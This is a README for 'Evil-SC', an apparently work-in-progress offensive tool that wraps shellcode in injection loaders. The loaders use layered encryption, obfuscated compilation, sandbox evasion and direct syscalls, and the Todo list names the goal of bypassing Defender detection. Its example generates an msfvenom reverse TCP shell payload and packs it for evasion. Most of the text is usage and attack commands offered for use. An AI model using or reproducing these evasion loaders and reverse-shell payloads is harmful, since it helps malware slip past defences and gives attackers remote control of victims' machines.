# Evil-SC - Template-based Shellcode Loader

## Introduction
Evil-SC is a template-based shellcode loader written in Python. It allows you to generate loader files for injecting shellcode into a target process, using different methods and encoders.

!! WORK IN PROGRESS !!

## Todo
- LLVM compiler --> Bypass SW3 defender detection (HackTool:Win64/NanoDump.LK!MTB) ?
- Functions name randomization ?
- uuid + DES3 bug 
- Indirect Syscall ?
[....]
- Make new Sandbox evasion templates
- Make new methods templates

## Usage
1. Clone the repository:
```bash
git clone https://github.com/your_username/evil-sc.git
cd evil-sc
```

2. Run the script
```
$ python evil-sc.py windows -h

    ███████╗██╗   ██╗██╗██╗      ███████╗ ██████╗
    ██╔════╝██║   ██║██║██║      ██╔════╝██╔════╝
    █████╗  ██║   ██║██║██║█████╗███████╗██║
    ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝╚════██║██║
    ███████╗ ╚████╔╝ ██║███████╗ ███████║╚██████╗
    ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
                                                 @v4resk

usage: evil-sc.py windows [-h] -m {SimpleExec,CurrentThread,CreateThread} [-e {nop,rc4,uuid,base64,aes,des3,xor}] [-l] [-p PROCESS_NAME] [-se {sleep}]
                          [-sc {SysWhispers3,GetSyscallStub}] [--sw-method {embedded,egg_hunter,jumper,jumper_randomized}] [-o OUTPUT_FILE] [--encoder ENCODER]
                          shellcode

positional arguments:
  shellcode             Specify the shellcode variable

options:
  -h, --help            show this help message and exit
  -m {SimpleExec,CurrentThread,CreateThread}, --method {SimpleExec,CurrentThread,CreateThread}
                        Shellcode-loading method
  -e {nop,rc4,uuid,base64,aes,des3,xor}, --encrypt {nop,rc4,uuid,base64,aes,des3,xor}
                        Template-dependent encryption or encoding method to be applied to the shellcode
  -l, --llvmo           Use Obfuscator-LLVM to compile
  -p PROCESS_NAME, --process PROCESS_NAME
                        Process name for shellcode injection
  -se {sleep}, --sandbox-evasion {sleep}
                        Sandbox evasion technique
  -sc {SysWhispers3,GetSyscallStub}, --syscall {SysWhispers3,GetSyscallStub}
                        Syscall execution method for supported templates
  --sw-method {embedded,egg_hunter,jumper,jumper_randomized}
                        Syscall execution method for supported templates
  -o OUTPUT_FILE, --outfile OUTPUT_FILE
                        Output filename
  --encoder ENCODER     Template-independent encoding method to be applied to the shellcode (default: sgn)

```

## Example

```bash
# Generate a shellcode
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /tmp/msfout.bin

# Pack it
python evil-sc.py windows -m SimpleExec -e xor -e aes -e nop -l -sc SysWhispers3 /tmp/msfout.bin
```

## Make a template

Windows template should start with "Win_"
Linux template should start with "Lin_"

## Resources

There is a lot to come here